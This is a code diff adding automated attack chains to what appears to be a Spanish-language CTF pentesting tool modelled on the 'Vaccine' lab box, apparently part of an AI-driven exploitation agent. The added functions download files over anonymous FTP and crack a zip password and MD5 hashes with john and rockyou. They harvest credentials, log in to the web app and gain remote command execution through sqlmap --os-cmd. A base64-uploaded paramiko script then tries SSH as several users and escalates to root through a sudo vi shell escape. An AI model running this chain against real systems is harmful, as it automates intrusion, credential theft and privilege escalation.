@@ -159,7 +159,235 @@ def pb_ftp(client, target, steps) -> list:
         else:
             hall = [f"{fn}: {content.strip()[:200]}"] if content.strip() else []
         _step(steps, "LOOT", f"descargar {fn}", "flag!" if found else "leído", content, hall)
+    # Cadena tipo Vaccine: si el FTP soltó archivos comprimidos (no había flag suelta),
+    # crackea el zip, cosecha credenciales del contenido y úsalas para login web -> SQLi
+    # -> RCE -> escalada SSH. Capa nueva: el cerebro IA no encadena loot con explotación.
+    if not flags:
+        creds = []
+        for fn in files:
+            if fn and fn not in (".", ".."):
+                creds += _crack_archive(client, target, fn, steps)
+        if creds:
+            flags += _web_creds_to_rce(client, target, creds, steps)
     return list(dict.fromkeys(flags))
+
+
+ROCKYOU = "/usr/share/wordlists/rockyou.txt"
+
+# Script paramiko que CORRE EN LA KALI para el SSH anidado al objetivo y la escalada
+# por GTFOBins (sudo <editor>). Se sube a la Kali en base64 y se ejecuta con
+# `python3 /tmp/lh_esc.py <ip> <password>`. Replica la escalada validada a mano en
+# Vaccine: SSH como usuario de BD -> sudo -l -> sudo /bin/vi pg_hba.conf -> :!cat root.txt.
+# Va por invoke_shell (pty) porque vi necesita terminal y sudoers casa el argumento exacto
+# del fichero (no admite `vi -c ...`), así que hay que pilotar vi de forma interactiva.
+_ESC_SCRIPT = r'''
+import sys, time, re, paramiko
+host, pw = sys.argv[1], sys.argv[2]
+USERS = ["postgres", "www-data", "mysql", "root", "admin", "dbadmin"]
+for u in USERS:
+    try:
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(host, username=u, password=pw, look_for_keys=False,
+                  allow_agent=False, timeout=12)
+    except Exception:
+        continue
+    # user.txt: el home del usuario de BD suele contenerlo (vía SSH es más fiable que sqlmap).
+    i, o, e = c.exec_command(
+        "cat /var/lib/postgresql/user.txt /home/*/user.txt ~/user.txt 2>/dev/null", timeout=12)
+    uf = re.search(r"[a-f0-9]{32}", o.read().decode("utf-8", "replace"))
+    if uf:
+        print("USERFLAG=%s" % uf.group(0))
+    # root.txt legible directamente (por si el usuario ya es privilegiado)?
+    i, o, e = c.exec_command("cat /root/root.txt /home/*/root.txt 2>/dev/null", timeout=12)
+    md = re.search(r"[a-f0-9]{32}", o.read().decode("utf-8", "replace"))
+    if md:
+        print("USER=%s ROOTFLAG=%s" % (u, md.group(0)))
+        c.close(); break
+    # sudo -l (con contraseña por stdin)
+    i, o, e = c.exec_command("echo '%s' | sudo -S -l 2>/dev/null" % pw, timeout=25)
+    sl = o.read().decode("utf-8", "replace")
+    m = re.search(r"(\S*(?:vi|vim|view|rvim|nano))\s+(\S+)", sl)
+    if not m:
+        c.close(); continue
+    editor, fpath = m.group(1), m.group(2)
+    ch = c.invoke_shell(); time.sleep(1.2)
+    def snd(s, w=2.5):
+        ch.send(s); time.sleep(w)
+    if "nano" in editor:
+        c.close(); continue   # nano no escapa a shell de forma fiable; solo editores vi
+    snd("sudo -S %s %s\n" % (editor, fpath), 1.5)
+    snd("%s\n" % pw, 3)       # sudo lee la contraseña del pty
+    snd(":!cat /root/root.txt > /tmp/lh_rf.txt; chmod 644 /tmp/lh_rf.txt\n", 3)
+    snd("\n", 1)              # "Press ENTER to continue"
+    snd(":q!\n", 2)
+    try:
+        ch.recv(65535)
+    except Exception:
+        pass
+    i, o, e = c.exec_command("cat /tmp/lh_rf.txt 2>/dev/null", timeout=12)
+    rf = o.read().decode("utf-8", "replace")
+    mf = re.search(r"[a-f0-9]{32}", rf)
+    print("USER=%s EDITOR=%s FILE=%s ROOTFLAG=%s" % (u, editor, fpath, mf.group(0) if mf else ""))
+    c.close()
+    if mf:
+        break
+'''
+
+
+def _crack_archive(client, target, fn, steps) -> list:
+    """Loot del FTP: si el archivo es un .zip (posiblemente cifrado) -> zip2john+rockyou
+    para la contraseña -> unzip -> cosecha credenciales del contenido: hashes MD5 (los
+    crackea con raw-md5) y usuarios de comparaciones tipo username==='admin'.
+    Devuelve [(user, pass), ...]."""
+    if not re.search(r"\.zip$", fn, re.I):
+        return []
+    z, d = "/tmp/lh_loot.zip", "/tmp/lh_unzip"
+    _run(client, f"rm -rf {z} {d}; mkdir -p {d}; curl -s --connect-timeout 10 -o {z} "
+                 f"ftp://anonymous:anonymous@{target}/{fn}", timeout=40)
+    test = _run(client, f"unzip -o {z} -d {d} 2>&1", timeout=20)
+    zpass = ""
+    if re.search(r"incorrect password|unsupported|need password|skipping", test, re.I):
+        jh = _run(client,
+            f"zip2john {z} > /tmp/lh_zip.hash 2>/dev/null; "
+            f"john --wordlist={ROCKYOU} /tmp/lh_zip.hash >/dev/null 2>&1; "
+            f"john --show /tmp/lh_zip.hash 2>/dev/null", timeout=180)
+        mz = re.search(r"^[^:]+:([^:]+):", jh, re.M)
+        if not mz:
+            _step(steps, "EXPLOIT", f"crackear zip {fn}",
+                  "john no sacó la contraseña con rockyou", jh[:300])
+            return []
+        zpass = mz.group(1)
+        _run(client, f"unzip -o -P '{zpass}' {z} -d {d} >/dev/null 2>&1", timeout=20)
+        _step(steps, "EXPLOIT", f"contraseña del zip {fn} crackeada",
+              f"zip pass = {zpass}", jh[:200], [f"zip_pass={zpass}"])
+    # Cosechar credenciales del contenido extraído.
+    blob = _run(client, f"find {d} -type f -exec cat {{}} + 2>/dev/null", timeout=20)
+    users = re.findall(r"(?:user(?:name)?)['\"]?\s*[=:)\]]*\s*===?\s*['\"]([^'\"]+)['\"]",
+                       blob, re.I)
+    users = list(dict.fromkeys(users)) or ["admin"]
+    md5s = list(dict.fromkeys(re.findall(r"\b([a-f0-9]{32})\b", blob)))
+    plains = []
+    if md5s:
+        _run(client, "printf '%s\\n' " + " ".join(f"'{h}'" for h in md5s) +
+             " > /tmp/lh_md5.txt", timeout=15)
+        _run(client, f"john --format=raw-md5 --wordlist={ROCKYOU} /tmp/lh_md5.txt "
+                     ">/dev/null 2>&1", timeout=180)
+        show = _run(client, "john --format=raw-md5 --show /tmp/lh_md5.txt 2>/dev/null",
+                    timeout=30)
+        plains = [m for m in re.findall(r"^[^:]*:(.+)$", show, re.M) if m and "password hash" not in m]
+        _step(steps, "EXPLOIT", "crackear hash(es) MD5 del código",
+              f"{len(plains)} contraseña(s)" if plains else "sin crackear",
+              show[:300], [f"md5={md5s}", f"plano={plains}"])
+    creds = [(u, p) for u in users for p in plains]
+    # Credenciales en texto plano (user:pass / user=...) por si las hubiera.
+    for mu, mp in re.findall(r"(\w+)\s*[:=]\s*([^\s'\";,]{4,})", blob):
+        if mp.lower() not in ("password", "username") and not re.fullmatch(r"[a-f0-9]{32}", mp):
+            creds.append((mu, mp))
+    creds = list(dict.fromkeys(creds))
+    if creds:
+        _step(steps, "LOOT", f"credenciales cosechadas de {fn}",
+              f"{len(creds)} par(es) user:pass", "",
+              [f"{u}:{p}" for u, p in creds[:8]])
+    return creds
+
+
+def _web_creds_to_rce(client, target, creds, steps) -> list:
+    """Con las credenciales del loot: login web en :80 -> dashboard con SQLi ->
+    sqlmap --os-cmd (RCE) lee user.txt -> saca la pass de BD del código fuente ->
+    SSH + escalada GTFOBins (sudo editor) -> root.txt. Patrón Vaccine."""
+    import base64 as _b64
+    flags, cj = [], "/tmp/lh_cj.txt"
+    logged = None
+    for user, pw in creds:
+        for pg in ("index.php", "login.php", ""):
+            r = _run(client, f"rm -f {cj}; curl -s -i -c {cj} "
+                f'--data-urlencode "username={user}" --data-urlencode "password={pw}" '
+                f"http://{target}/{pg}", timeout=25)
+            loc = re.search(r"[Ll]ocation:\s*(\S+)", r)
+            if "302" in r and loc:
+                logged = (user, pw, loc.group(1).strip())
+                break
+        if logged:
+            break
+    if not logged:
+        _step(steps, "EXPLOIT", "login web con creds del loot",
+              "ninguna cred logró sesión (302)", "")
+        return []
+    user, pw, dash = logged
+    dashpath = dash if dash.startswith("/") else "/" + dash
+    dashurl = f"http://{target}{dashpath}"
+    _step(steps, "EXPLOIT", f"login web {user}:{pw}",
+          "sesión iniciada (302)", "", [f"cred={user}:{pw}", f"dashboard={dashpath}"])
+
+    # Parámetro de entrada del dashboard + cookie de sesión.
+    page = _run(client, f"curl -s -b {cj} {dashurl}", timeout=20)
+    pm = re.search(r'name=["\']?(\w+)["\']?', page)
+    param = pm.group(1) if pm else "search"
+    cookie = _run(client, f"awk '/PHPSESSID/{{print $NF}}' {cj} 2>/dev/null").strip()
+    inj = f"{dashurl}?{param}=a"
+    sqlmap = (f'sqlmap -u "{inj}" --cookie="PHPSESSID={cookie}" --batch '
+              "--technique=ES --level=2 --risk=2")
+
+    # 1) SQLi -> RCE -> user.txt (rutas típicas de homes de servicio).
+    out = _run(client, sqlmap + ' --os-cmd="cat /var/lib/postgresql/user.txt '
+               '/home/*/user.txt /var/lib/mysql/user.txt 2>/dev/null" 2>&1', timeout=300)
+    found = FLAG_RE.findall(out)
+    if found:
+        flags += found
+    _step(steps, "EXPLOIT" if not found else "LOOT",
+          f"sqlmap --os-cmd RCE en ?{param}=",
+          "flag de usuario!" if found else "RCE intentado (sin flag de usuario)",
+          out[-1500:], [f"flag={found[0]}"] if found else [])
+
+    # 2) Pass de BD del código fuente (base64 para esquivar comillas/'!') -> escalada SSH.
+    dbpw = ""
+    for src_file in ("/var/www/html/dashboard.php", "/var/www/html/config.php",
+                     "/var/www/html/index.php"):
+        b64 = _run(client, sqlmap + f' --os-cmd="base64 -w0 {src_file}" 2>&1', timeout=200)
+        mb = re.search(r"command standard output:\s*'([A-Za-z0-9+/=]{20,})'", b64)
+        if not mb:
+            continue
+        try:
+            srctxt = _b64.b64decode(mb.group(1)).decode("utf-8", "replace")
+        except Exception:
+            srctxt = ""
+        mp = (re.search(r"password\s*=\s*([^\s'\";)]+)", srctxt, re.I)
+              or re.search(r"password['\"]?\s*[=:>]+\s*['\"]([^'\"]+)['\"]", srctxt, re.I))
+        if mp:
+            dbpw = mp.group(1)
+            _step(steps, "LOOT", f"pass de BD en {src_file}",
+                  "credencial extraída", f"password={dbpw}", [f"db_pass={dbpw}"])
+            break
+    if dbpw:
+        flags += _ssh_escalate(client, target, dbpw, steps)
+    return list(dict.fromkeys(flags))
+
+
+def _ssh_escalate(client, target, password, steps) -> list:
+    """Sube el script paramiko a la Kali y lo ejecuta para el SSH anidado al objetivo +
+    escalada GTFOBins (sudo editor -> :!cat root.txt). Devuelve [root_flag] o []."""
+    import base64 as _b64
+    b64 = _b64.b64encode(_ESC_SCRIPT.encode()).decode()
+    _run(client, f"echo {b64} | base64 -d > /tmp/lh_esc.py", timeout=15)
+    out = _run(client, f"python3 /tmp/lh_esc.py {target} '{password}' 2>&1", timeout=320)
+    mf = re.search(r"ROOTFLAG=([a-f0-9]{32})", out)
+    muf = re.search(r"USERFLAG=([a-f0-9]{32})", out)
+    mu = re.search(r"USER=(\S+)", out)
+    rootflag = mf.group(1) if mf else ""
+    userflag = muf.group(1) if muf else ""
+    found = [f for f in (userflag, rootflag) if f]
+    hall = []
+    if userflag:
+        hall.append(f"user.txt={userflag}")
+    if rootflag:
+        hall.append(f"root.txt={rootflag} (via {mu.group(1) if mu else '?'})")
+    _step(steps, "LOOT" if rootflag else "EXPLOIT",
+          "escalada SSH (user.txt + sudo editor / GTFOBins)",
+          "user+root!" if rootflag and userflag else
+          ("root.txt!" if rootflag else "SSH/escala intentada sin root"),
+          out[-1200:], hall)
+    return found
 
 
 def pb_smb(client, target, steps) -> list:
